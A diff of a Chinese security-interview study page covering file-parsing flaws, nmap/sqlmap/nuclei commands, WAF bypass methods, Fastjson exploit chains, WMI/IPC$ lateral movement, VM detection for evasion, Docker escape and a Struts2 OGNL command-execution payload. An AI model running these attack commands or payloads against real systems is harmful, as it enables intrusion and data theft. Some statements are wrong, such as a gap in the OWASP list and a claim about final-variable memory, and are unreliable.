href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">100.</span> <span class="toc-text">常见攻击扫描命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E7%B1%BB%E9%97%AE%E9%A2%98"><span class="toc-number">101.</span> <span class="toc-text">SMB服务基础概念类问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%B1%BB%E9%97%AE%E9%A2%98"><span class="toc-number">102.</span> <span class="toc-text">SMB服务安全漏洞类问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fofa%E8%AF%AD%E6%B3%95"><span class="toc-number">103.</span> <span class="toc-text">Fofa语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80%EF%BC%8C%E8%9A%81%E5%89%91%EF%BC%8C%E5%86%B0%E8%9D%8E%EF%BC%8C%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">104.</span> <span class="toc-text">菜刀，蚁剑，冰蝎，哥斯拉</span></a></li></ol>
       </div>
     
   </span>
@@ -164,6 +164,7 @@
 
   <div class="content e-content" itemprop="articleBody">
     <p><a target="_blank" rel="noopener" href="https://github.com/vvmdx/Sec-Interview-4-2023">https://github.com/vvmdx/Sec-Interview-4-2023</a></p>
+<h3 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h3><p>A1 注入漏洞<br>A2 失效的身份认证<br>A3 敏感数据泄露<br>A4 XML 外部实体漏洞<br>A5 无效的访问控制<br>A6 安全配置错误<br>A8 不安全的反序列化漏洞<br>A9 使用含有已知漏洞的组件<br>A10 日志记录和监控不足导致的风险</p>
 <h3 id="MSSQL-除了-xp-cmdshell、sp-oacreate-还有什么办法执行命令？"><a href="#MSSQL-除了-xp-cmdshell、sp-oacreate-还有什么办法执行命令？" class="headerlink" title="MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？"></a>MSSQL 除了 <code>xp_cmdshell</code>、<code>sp_oacreate</code> 还有什么办法执行命令？</h3><p>在 MSSQL 中，除了使用 <code>xp_cmdshell</code> 和 <code>sp_oacreate</code>，还可以通过以下方法执行系统命令：</p>
 <ol>
 <li><p><strong>CLR 集成</strong>：</p>
@@ -727,6 +728,630 @@
 <p>利用<br>攻击者可以通过构造特定的输入来执行恶意代码，例如读取系统文件或执行系统命令。以下是一个读取系统文件的示例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>这将返回 Flask 应用的配置项，可能包含敏感信息。</p>
+<p>文件解析漏洞是指攻击者通过巧妙构造的文件名或请求，使得Web服务器错误地解析文件，从而执行恶意代码或获取未授权访问权限的漏洞。这种漏洞在IIS、Apache、Nginx等常见Web服务器中都有可能出现，以下是对这三种服务器文件解析漏洞的详细讲解和举例说明。</p>
+<h3 id="IIS文件解析漏洞"><a href="#IIS文件解析漏洞" class="headerlink" title="IIS文件解析漏洞"></a>IIS文件解析漏洞</h3><p>IIS在解析文件时，有时会根据文件名中的第一个扩展名来决定如何处理文件，而忽略后面的扩展名。例如，文件名<code>example.asp;.jpg</code>会被IIS视为ASP脚本，而不管后面的<code>.jpg</code>扩展名。此外，在IIS5.x&#x2F;6.0中，如果在网站下建立名为<code>.asp</code>、<code>.asa</code>等的文件夹，那么该文件夹内的任何文件都会被IIS当作ASP文件来解析并执行。<br>假设攻击者上传了一个名为<code>test.asp;.jpg</code>的文件，该文件实际上是一个包含ASP代码的图片文件。由于IIS在解析时会优先识别<code>.asp</code>扩展名，因此会将该文件当作ASP脚本执行，从而执行其中的恶意代码。</p>
+<ul>
+<li><strong>严格文件上传验证</strong>：限制上传文件类型，通过MIME类型和文件扩展名双重检查，确保只允许合法的文件上传。同时，重命名上传文件，避免攻击者利用文件扩展名进行攻击。</li>
+<li><strong>正确配置IIS</strong>：确保处理程序映射正确配置，只允许特定扩展名的文件由特定处理程序处理，其他扩展名的文件作为静态文件处理。</li>
+<li><strong>使用URL重写规则</strong>：通过规则禁止带有多重扩展名的文件请求。</li>
+</ul>
+<h3 id="Apache文件解析漏洞"><a href="#Apache文件解析漏洞" class="headerlink" title="Apache文件解析漏洞"></a>Apache文件解析漏洞</h3><p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别时，会继续向左识别，直到找到一个已知的MIME类型。例如，文件名<code>shell.php.xxx.yyy</code>，由于Apache不认识<code>.yyy</code>和<code>.xxx</code>后缀，会继续向左识别，发现<code>.php</code>后缀，便将文件交给PHP处理。<br>攻击者上传一个名为<code>example.php.jpg</code>的文件，Apache会将其解析为PHP文件并执行其中的恶意代码。</p>
+<ul>
+<li><strong>升级到最新版本</strong>：应用Apache服务器的最新安全更新和补丁。</li>
+<li><strong>修改配置</strong>：在Apache配置文件中添加规则，限制可以上传和处理的文件类型。</li>
+<li><strong>使用安全模式</strong>：将Apache与PHP的结合模式从module切换到fastcgi，因为后者不容易受到多后缀解析漏洞的影响。</li>
+</ul>
+<h3 id="Nginx文件解析漏洞"><a href="#Nginx文件解析漏洞" class="headerlink" title="Nginx文件解析漏洞"></a>Nginx文件解析漏洞</h3><p>Nginx在处理请求时，如果请求的URL最后的文件名以脚本后缀（如<code>.php</code>）结尾，会将整个请求当作脚本执行。此外，如果Nginx的配置不当，也可能导致文件解析漏洞。例如，当<code>fastcgi_params</code>配置中<code>SCRIPT_FILENAME</code>的值设置不当时，可能会导致PHP错误地解析文件。<br>攻击者访问<code>http://example.com/xxoo.jpg/xxoo.php</code>，Nginx会将<code>xxoo.jpg</code>当作PHP脚本执行，从而执行其中的恶意代码。</p>
+<ul>
+<li><strong>正确配置Nginx</strong>：确保Nginx的配置正确，避免错误地解析请求的URI。</li>
+<li><strong>限制文件类型</strong>：在Nginx配置中限制可以解析的文件类型，避免不必要的文件被当作脚本执行。</li>
+<li><strong>升级版本</strong>：及时升级Nginx到最新版本，以获取最新的安全修复。<br>文件解析漏洞在IIS、Apache、Nginx等Web服务器中都有可能出现，其原理主要是服务器在解析文件时的特殊行为被攻击者利用。防御措施主要包括严格文件上传验证、正确配置服务器、升级到最新版本等，以确保服务器的安全性。</li>
+</ul>
+<p>以下是网络安全面试官视角下对nmap、msf、sqlmap常见命令，以及Java中final和static关键字的用途及区别的详细解答：</p>
+<h3 id="nmap常见命令"><a href="#nmap常见命令" class="headerlink" title="nmap常见命令"></a>nmap常见命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nmap -sP 192.168.1.0/24</code></td>
+<td>扫描局域网内在线设备的IP地址</td>
+</tr>
+<tr>
+<td><code>nmap -sS 192.168.1.1 -p 1-1000</code></td>
+<td>对指定IP进行半开式TCP扫描，检测1-1000端口开放情况</td>
+</tr>
+<tr>
+<td><code>nmap -sV 192.168.1.1</code></td>
+<td>探测目标主机开放端口对应的服务及其版本信息</td>
+</tr>
+<tr>
+<td><code>nmap -O 192.168.1.1</code></td>
+<td>尝试识别目标主机的操作系统类型</td>
+</tr>
+<tr>
+<td><code>nmap -sC 192.168.1.1</code></td>
+<td>使用默认脚本对目标主机进行扫描，可获取更多应用服务信息</td>
+</tr>
+<tr>
+<td><code>nmap -A 192.168.1.1</code></td>
+<td>启用高级扫描模式，包含服务版本探测、操作系统检测和脚本扫描</td>
+</tr>
+</tbody></table>
+<h3 id="sqlmap常见命令"><a href="#sqlmap常见命令" class="headerlink" title="sqlmap常见命令"></a>sqlmap常见命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot;</code></td>
+<td>对指定URL中的参数id进行SQL注入检测</td>
+</tr>
+<tr>
+<td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; --dbs</code></td>
+<td>检测目标是否存在SQL注入漏洞，并枚举所有数据库</td>
+</tr>
+<tr>
+<td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; -D dbname --tables</code></td>
+<td>在指定数据库dbname中枚举所有数据表</td>
+</tr>
+<tr>
+<td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; -D dbname -T tbname --columns</code></td>
+<td>枚举指定数据库dbname中表tbname的所有列</td>
+</tr>
+<tr>
+<td><code>sqlmap.py -u &quot;http://example.com/page?id=1&quot; -D dbname -T tbname -C &quot;username,password&quot; --dump</code></td>
+<td>导出指定表中列username和password的数据</td>
+</tr>
+</tbody></table>
+<h3 id="Java中final关键字的用途"><a href="#Java中final关键字的用途" class="headerlink" title="Java中final关键字的用途"></a>Java中final关键字的用途</h3><ol>
+<li><strong>修饰变量</strong>：当final修饰一个变量时，该变量的值在初始化后不可改变。这通常用于定义常量，例如<code>final double PI = 3.14;</code>，保证PI的值在程序运行过程中不会被修改。</li>
+<li><strong>修饰方法</strong>：final修饰的方法不能被子类重写。例如，<code>public final void display();</code>，确保所有子类必须按照父类定义的方式实现该方法，保持特定功能的一致性。</li>
+<li><strong>修饰类</strong>：final修饰的类不能被继承。如<code>final class MyClass &#123;&#125;</code>，防止其他类继承MyClass，确保其内部实现细节不被外部访问和修改，增强封装性和安全性。</li>
+</ol>
+<h3 id="Java中static关键字的用途"><a href="#Java中static关键字的用途" class="headerlink" title="Java中static关键字的用途"></a>Java中static关键字的用途</h3><ol>
+<li><strong>修饰变量</strong>：static修饰的变量属于类，不属于类的任何对象。所有对象共享同一个static变量，例如<code>static int count = 0;</code>，用于记录创建对象的数量，每个对象对该变量的修改都会影响其他对象。</li>
+<li><strong>修饰方法</strong>：static修饰的方法属于类，可通过类名直接调用，无需创建对象。例如<code>public static void main(String[] args)</code>，是Java程序的入口方法，不依赖任何对象存在。</li>
+<li><strong>修饰代码块</strong>：static代码块在类加载时执行，用于初始化类的资源或进行一些必要的预处理操作，确保类在使用前完成特定的初始化任务。</li>
+</ol>
+<h3 id="final和static的区别"><a href="#final和static的区别" class="headerlink" title="final和static的区别"></a>final和static的区别</h3><table>
+<thead>
+<tr>
+<th>区别维度</th>
+<th>final</th>
+<th>static</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>修饰对象</strong></td>
+<td>可修饰变量、方法、类</td>
+<td>主要修饰变量、方法、代码块</td>
+</tr>
+<tr>
+<td><strong>生命周期</strong></td>
+<td>final变量一旦赋值不可改变；final方法和类的定义在程序运行期间固定</td>
+<td>static变量和方法随类加载而存在，不依赖对象；static代码块在类加载时执行一次</td>
+</tr>
+<tr>
+<td><strong>内存分配</strong></td>
+<td>final修饰的对象在栈中分配内存，遵循正常变量的内存管理</td>
+<td>static修饰的对象在方法区（静态区）分配内存，独立于对象的生命周期</td>
+</tr>
+<tr>
+<td><strong>访问方式</strong></td>
+<td>final变量需通过对象访问（除非是类变量）；final方法通过对象或类名调用；final类只能通过类名引用</td>
+<td>static变量和方法可通过类名直接访问，无需对象；static代码块由JVM自动调用</td>
+</tr>
+</tbody></table>
+<p>以下是关于WAF绕过、云WAF绕过、Fastjson反序列化与Java反序列化的区别、Fastjson高版本攻击方法以及利用链的详细解答：</p>
+<h3 id="WAF绕过方法"><a href="#WAF绕过方法" class="headerlink" title="WAF绕过方法"></a>WAF绕过方法</h3><ol>
+<li><strong>请求方式变换</strong>：将GET请求改为POST请求，或者将POST请求改为GET请求，绕过WAF对特定请求方式的检测。</li>
+<li><strong>Content-Type变换</strong>：修改请求的Content-Type，如从<code>application/x-www-form-urlencoded</code>改为<code>multipart/form-data</code>，使WAF无法正确解析和检测请求内容。</li>
+<li><strong>参数污染</strong>：通过在请求中添加多个相同名称的参数，干扰WAF的参数解析和检测逻辑。</li>
+<li><strong>大小写变形</strong>：利用WAF对大小写敏感的特点，将敏感关键词进行大小写变换，如将<code>or</code>变为<code>Or</code>、<code>OR</code>等。</li>
+<li><strong>等价替换</strong>：将敏感操作符进行等价替换，如将<code>and</code>替换为<code>&amp;&amp;</code>，<code>or</code>替换为<code>||</code>。</li>
+<li><strong>注释绕过</strong>：在SQL注入等场景中，使用注释符（如<code>/* */</code>、<code>#</code>）将敏感语句分隔，绕过WAF的规则检测。</li>
+<li><strong>URL编码</strong>：对敏感字符进行URL编码，如将<code>&#39;</code>编码为<code>%27</code>，<code>/</code>编码为<code>%2f</code>等，使WAF无法直接识别。</li>
+<li><strong>空字节绕过</strong>：在请求中插入空字节（<code>%00</code>），使WAF在处理时停止解析后续内容，从而绕过检测。</li>
+</ol>
+<h3 id="云WAF绕过方法"><a href="#云WAF绕过方法" class="headerlink" title="云WAF绕过方法"></a>云WAF绕过方法</h3><ol>
+<li><strong>伪造头部信息</strong>：通过修改请求头部的<code>X-Forwarded-For</code>字段，伪造IP地址为可信地址（如<code>127.0.0.1</code>），使云WAF误认为是合法请求。</li>
+<li><strong>寻找源站</strong>：针对云WAF部署的网站，寻找其真实源站IP，直接对源站发起攻击，绕过云WAF的防护。</li>
+<li><strong>利用同网段</strong>：利用与目标服务器同网段的主机进行攻击，使流量不经过云WAF的防护区域。</li>
+</ol>
+<h3 id="Fastjson反序列化与Java反序列化的区别"><a href="#Fastjson反序列化与Java反序列化的区别" class="headerlink" title="Fastjson反序列化与Java反序列化的区别"></a>Fastjson反序列化与Java反序列化的区别</h3><ul>
+<li><strong>序列化机制</strong>：<ul>
+<li><strong>Fastjson</strong>：Fastjson是阿里巴巴开发的一个轻量级Java库，用于将Java对象转换为JSON格式的字符串，以及将JSON字符串解析为Java对象。它通过<code>JSON.toJSONString()</code>方法进行序列化，通过<code>JSON.parseObject()</code>或<code>JSON.parse()</code>方法进行反序列化。</li>
+<li><strong>Java反序列化</strong>：Java自带的序列化机制通过<code>java.io.Serializable</code>接口实现，将对象的状态信息转换为可以存储或传输的形式，再在另一端重新还原为对象。</li>
+</ul>
+</li>
+<li><strong>漏洞产生原理</strong>：<ul>
+<li><strong>Fastjson</strong>：Fastjson在反序列化过程中，通过<code>@type</code>参数指定类的类型，并调用该类的构造方法、<code>set</code>和<code>get</code>方法，如果这些方法中存在可被利用的代码，就可能导致反序列化漏洞。</li>
+<li><strong>Java反序列化</strong>：Java反序列化漏洞通常是由于在反序列化过程中，攻击者可以构造恶意的序列化数据，触发目标类中的<code>readObject()</code>等方法中的漏洞代码，从而执行任意代码。</li>
+</ul>
+</li>
+<li><strong>利用方式</strong>：<ul>
+<li><strong>Fastjson</strong>：攻击者通过构造包含恶意<code>@type</code>参数的JSON字符串，使Fastjson在反序列化时触发漏洞。</li>
+<li><strong>Java反序列化</strong>：攻击者构造恶意的序列化对象，通过网络传输或文件上传等方式传递给目标系统，目标系统在反序列化时触发漏洞。</li>
+</ul>
+</li>
+</ul>
+<h3 id="Fastjson高版本攻击方法"><a href="#Fastjson高版本攻击方法" class="headerlink" title="Fastjson高版本攻击方法"></a>Fastjson高版本攻击方法</h3><ul>
+<li><strong>利用Autotype机制</strong>：在Fastjson的某些高版本中，虽然默认关闭了Autotype功能，但可以通过设置<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</code>来开启。攻击者可以利用这一点，构造包含恶意<code>@type</code>参数的JSON字符串，使Fastjson在反序列化时执行任意代码。</li>
+<li><strong>利用其他反序列化漏洞</strong>：即使Autotype功能被禁用，Fastjson在处理复杂对象时仍可能存在其他反序列化漏洞。攻击者可以通过研究Fastjson的反序列化逻辑，寻找新的利用点。</li>
+</ul>
+<h3 id="Fastjson不出网的攻击方法"><a href="#Fastjson不出网的攻击方法" class="headerlink" title="Fastjson不出网的攻击方法"></a>Fastjson不出网的攻击方法</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80064376/article/details/146132528">高版本利用方法</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11938">https://xz.aliyun.com/news/11938</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/365680.html">https://www.freebuf.com/articles/web/365680.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14309">https://xz.aliyun.com/news/14309</a></p>
+<h3 id="Fastjson常见利用链"><a href="#Fastjson常见利用链" class="headerlink" title="Fastjson常见利用链"></a>Fastjson常见利用链</h3><ul>
+<li><strong>JRMP利用链</strong>：攻击者通过构造包含<code>@type</code>为<code>java.rmi.server.UnicastRemoteObject</code>的JSON字符串，触发JRMP（Java Remote Method Protocol）反序列化漏洞，连接到攻击者控制的RMI服务器，下载并执行恶意代码。</li>
+<li><strong>CommonsCollections利用链</strong>：利用<code>org.apache.commons.collections</code>包中的<code>Transformer</code>类的反序列化漏洞，结合Fastjson的反序列化过程，执行任意代码。</li>
+<li><strong>其他利用链</strong>：根据目标系统中使用的其他第三方库或组件的反序列化漏洞，结合Fastjson的特性，构造相应的利用链。</li>
+</ul>
+<h3 id="内网渗透横向手段"><a href="#内网渗透横向手段" class="headerlink" title="内网渗透横向手段"></a>内网渗透横向手段</h3><h4 id="1-IPC-横向移动"><a href="#1-IPC-横向移动" class="headerlink" title="1. IPC$横向移动"></a>1. IPC$横向移动</h4><ul>
+<li><strong>原理</strong>：IPC$是Windows系统中用于进程间通信的共享命名管道，通过139或445端口进行通信。攻击者可以利用IPC$连接，将恶意代码或工具传输到目标主机，并在目标主机上执行命令。</li>
+<li><strong>操作示例</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-WMI横向移动"><a href="#2-WMI横向移动" class="headerlink" title="2. WMI横向移动"></a>2. WMI横向移动</h4><ul>
+<li><strong>原理</strong>：WMI（Windows Management Instrumentation）是Windows系统中用于管理本地和远程计算机的工具。攻击者可以利用WMI在远程主机上执行命令。</li>
+<li><strong>操作示例</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span> /user:username /password:password process <span class="keyword">call</span> create &quot;<span class="built_in">cmd</span> /c malicious_command&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-SMB横向移动"><a href="#3-SMB横向移动" class="headerlink" title="3. SMB横向移动"></a>3. SMB横向移动</h4><ul>
+<li><strong>原理</strong>：SMB（Server Message Block）协议用于文件共享和打印服务，通过445端口进行通信。攻击者可以利用SMB协议在内网中传播恶意软件或执行远程命令。</li>
+<li><strong>操作示例</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\share &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="免杀相关：判断是否是虚拟机环境"><a href="#免杀相关：判断是否是虚拟机环境" class="headerlink" title="免杀相关：判断是否是虚拟机环境"></a>免杀相关：判断是否是虚拟机环境</h3><ul>
+<li><strong>查看主机名和进程</strong>：通过查看主机名和进程信息，可以初步判断是否处于虚拟机环境。虚拟机环境中的主机名和进程可能包含特定的虚拟机标识。</li>
+<li><strong>利用cgroup信息的差异</strong>：通过查看系统进程的cgroup信息，可以识别当前进程所处的运行环境。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure></li>
+<li><strong>检查根目录下的<code>.dockerenv</code>文件</strong>：如果存在该文件，说明当前环境是Docker容器。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv</span><br></pre></td></tr></table></figure></li>
+<li><strong>检查挂载信息</strong>：通过查看挂载信息，可以推测当前所处的环境。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="云原生攻防思路以及手段"><a href="#云原生攻防思路以及手段" class="headerlink" title="云原生攻防思路以及手段"></a>云原生攻防思路以及手段</h3><h4 id="攻防思路"><a href="#攻防思路" class="headerlink" title="攻防思路"></a>攻防思路</h4><ol>
+<li><strong>突破网络隔离</strong>：攻击者可以利用云原生环境中的网络配置漏洞，如VPC、安全组等，突破网络隔离。</li>
+<li><strong>突破资源隔离</strong>：通过容器逃逸、虚拟机逃逸等手段，突破资源隔离。</li>
+<li><strong>突破权限隔离</strong>：利用云原生环境中的权限管理漏洞，如IAM账号、策略等，提升权限。</li>
+<li><strong>突破架构隔离</strong>：针对多租户环境，攻击者可以利用逻辑多租的漏洞，突破架构隔离。</li>
+</ol>
+<h4 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h4><ul>
+<li><strong>容器逃逸</strong>：利用容器运行时的漏洞，从容器逃逸到宿主机。</li>
+<li><strong>Kubernetes集群攻击</strong>：攻击者可以利用Kubernetes集群中的未授权访问、API Server漏洞等，控制整个集群。</li>
+<li><strong>云存储攻击</strong>：攻击者可以利用云存储服务的漏洞，如Bucket公开访问、权限配置不当等，窃取敏感数据。</li>
+</ul>
+<h3 id="Docker逃逸的手段"><a href="#Docker逃逸的手段" class="headerlink" title="Docker逃逸的手段"></a>Docker逃逸的手段</h3><h4 id="1-利用内核漏洞"><a href="#1-利用内核漏洞" class="headerlink" title="1. 利用内核漏洞"></a>1. 利用内核漏洞</h4><ul>
+<li><strong>原理</strong>：Docker容器依赖于宿主机的内核，如果内核存在漏洞，攻击者可以利用这些漏洞从容器逃逸到宿主机。</li>
+<li><strong>操作示例</strong>：利用已知的内核漏洞（如Dirty COW）进行逃逸。</li>
+</ul>
+<h4 id="2-利用Docker版本漏洞"><a href="#2-利用Docker版本漏洞" class="headerlink" title="2. 利用Docker版本漏洞"></a>2. 利用Docker版本漏洞</h4><ul>
+<li><strong>原理</strong>：某些Docker版本可能存在安全漏洞，攻击者可以利用这些漏洞进行逃逸。</li>
+<li><strong>操作示例</strong>：利用Docker特定版本的漏洞，如<code>docker escape</code>漏洞。</li>
+</ul>
+<h4 id="3-利用CDK自动化工具"><a href="#3-利用CDK自动化工具" class="headerlink" title="3. 利用CDK自动化工具"></a>3. 利用CDK自动化工具</h4><ul>
+<li><strong>原理</strong>：通过自动化工具（如CDK）进行容器部署时，可能存在配置不当或漏洞，攻击者可以利用这些进行逃逸。</li>
+<li><strong>操作示例</strong>：通过分析CDK生成的配置文件，寻找潜在的漏洞利用点。</li>
+</ul>
+<h4 id="4-利用挂载点"><a href="#4-利用挂载点" class="headerlink" title="4. 利用挂载点"></a>4. 利用挂载点</h4><ul>
+<li><strong>原理</strong>：如果容器挂载了宿主机的敏感目录，攻击者可以修改宿主机上的文件或配置，从而实现逃逸。</li>
+<li><strong>操作示例</strong>：通过挂载点修改宿主机上的关键文件。</li>
+</ul>
+<h3 id="Struts2-OGNL-注入漏洞："><a href="#Struts2-OGNL-注入漏洞：" class="headerlink" title="Struts2 OGNL 注入漏洞："></a><strong>Struts2 OGNL 注入漏洞</strong>：</h3><p><strong>Struts2 OGNL 注入漏洞</strong>是由于框架在处理用户请求时，没有对 OGNL 表达式（Object-Graph Navigation Language）做严格的输入校验，导致攻击者可以构造恶意表达式，在服务端被当作代码执行，从而实现远程命令执行（RCE）。</p>
+<p>本质上，这是一个<strong>表达式注入</strong>问题，关键原因在于：</p>
+<ul>
+<li>Struts2 在一些标签（如 <code>%&#123;&#125;</code>）、参数绑定、错误信息回显中<strong>自动执行了 OGNL 表达式</strong>。</li>
+<li>用户输入未经安全处理就被带入 OGNL 执行上下文，攻击者就可以构造如：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>, #cmd=<span class="string">&#x27;whoami&#x27;</span>, <span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(#cmd)&#125;</span><br></pre></td></tr></table></figure></li>
+<li>导致任意命令执行。</li>
+</ul>
+<p>常见漏洞编号如：</p>
+<ul>
+<li>CVE-2017-5638（S2-045，Content-Type 头中的 OGNL）</li>
+<li>CVE-2018-11776（URL 路由参数未校验）</li>
+</ul>
+<p>当然可以！下面是<strong>网络安全面试中常问的常见扫描工具及其用法总结</strong>，涵盖端口扫描、漏洞扫描、目录扫描、资产信息探测等多个维度，方便你面试时系统作答。</p>
+<h3 id="常见攻击扫描命令"><a href="#常见攻击扫描命令" class="headerlink" title="常见攻击扫描命令"></a>常见攻击扫描命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -p- 192.168.1.1      <span class="comment"># 全端口 TCP 扫描</span></span><br><span class="line">nmap -sV 192.168.1.1              <span class="comment"># 识别服务版本</span></span><br><span class="line">nmap -A 192.168.1.1               <span class="comment"># 开启操作系统识别、版本、脚本</span></span><br><span class="line">nmap -sU -p 53 192.168.1.1        <span class="comment"># UDP 端口扫描</span></span><br><span class="line">nmap --script vuln target.com     <span class="comment"># 使用 NSE 漏洞脚本扫描</span></span><br><span class="line"></span><br><span class="line">masscan -p1-65535 192.168.1.0/24 --rate=10000</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u http://target.com -e php,asp,html -w wordlist.txt</span><br><span class="line"></span><br><span class="line">nuclei -u http://target.com -t cves/ -severity critical</span><br><span class="line">nuclei -list targets.txt -tags rce,xss</span><br><span class="line"></span><br><span class="line">**WhatWeb / Wappalyzer / Webanalyze** – Web 指纹识别</span><br><span class="line">whatweb http://target.com</span><br><span class="line"></span><br><span class="line">xray webscan --url http://target.com --plugins xss,sqli,xxe --html-output report.html</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> --dbs</span><br><span class="line">sqlmap --batch --cookie=<span class="string">&quot;sessionid=...&quot;</span> --risk=3 --level=5</span><br></pre></td></tr></table></figure>
+<p>以下是有关SMB服务的常见面试问题，按照不同类别进行整理：</p>
+<h3 id="SMB服务基础概念类问题"><a href="#SMB服务基础概念类问题" class="headerlink" title="SMB服务基础概念类问题"></a>SMB服务基础概念类问题</h3><ol>
+<li><p><strong>什么是SMB服务？它的主要功能是什么？</strong></p>
+<ul>
+<li>SMB（Server Message Block）服务是一种网络文件共享协议，主要用于在计算机之间共享文件、打印机和其他资源。它允许客户端应用程序访问服务器上的文件和目录，就像访问本地文件系统一样。</li>
+</ul>
+</li>
+<li><p><strong>SMB服务使用哪些端口进行通信？</strong></p>
+<ul>
+<li>SMB服务通常使用TCP端口139和445进行通信。端口139使用NetBIOS会话服务，而端口445则是直接使用TCP&#x2F;IP，不依赖于NetBIOS。</li>
+</ul>
+</li>
+<li><p><strong>SMB协议有哪些版本？它们之间有什么区别？</strong></p>
+<ul>
+<li>SMB协议有多个版本，如SMB1.0、SMB2.0、SMB2.1、SMB3.0等。SMB2.0及以上版本在性能、安全性等方面有较大改进，例如SMB2.0减少了往返次数，提高了传输效率，SMB3.0增加了数据加密等功能。</li>
+</ul>
+</li>
+</ol>
+<h3 id="SMB服务安全漏洞类问题"><a href="#SMB服务安全漏洞类问题" class="headerlink" title="SMB服务安全漏洞类问题"></a>SMB服务安全漏洞类问题</h3><ol>
+<li><p><strong>SMB服务存在哪些安全漏洞？</strong></p>
+<ul>
+<li>SMB服务存在多种安全漏洞，如“永恒之蓝”（EternalBlue）漏洞，它利用SMBv1协议的漏洞，允许攻击者在目标系统上执行任意代码。</li>
+</ul>
+</li>
+<li><p><strong>如何防范SMB服务的安全漏洞？</strong></p>
+<ul>
+<li>防范SMB服务的安全漏洞措施包括：及时更新系统和SMB服务的补丁、禁用不必要的SMB版本（如SMBv1）、限制对SMB服务的网络访问、使用防火墙规则等。</li>
+</ul>
+</li>
+<li><p><strong>如何检测和修复SMB服务的漏洞？</strong></p>
+<ul>
+<li>可以使用漏洞扫描工具（如Nessus、OpenVAS等）来检测SMB服务的漏洞。修复漏洞通常需要安装相应的安全补丁，或者根据漏洞的具体情况采取相应的配置更改等措施。</li>
+</ul>
+</li>
+</ol>
+<h3 id="Fofa语法"><a href="#Fofa语法" class="headerlink" title="Fofa语法"></a>Fofa语法</h3><table>
+<thead>
+<tr>
+<th>语法</th>
+<th>示例</th>
+<th>用途说明</th>
+<th>&#x3D;</th>
+<th>!&#x3D;</th>
+<th>*&#x3D;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ip</td>
